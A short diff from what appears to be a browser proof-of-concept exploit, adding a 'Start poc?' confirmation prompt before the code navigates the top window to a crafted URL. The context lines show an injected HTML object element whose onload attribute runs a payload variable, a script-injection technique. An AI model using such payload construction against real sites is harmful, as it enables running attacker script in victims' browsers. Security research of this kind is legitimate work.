@@ -30,6 +30,11 @@
             `//${location.host}/empty.html name=lload onload=${payload}></object>`
         );
 
+        if(top === window){
+            let startPoc = confirm("Start poc?");
+            if(!startPoc) throw /stopped/;
+        }
+        
         // Visit generated payload
         top.location = top_url + '##'
 
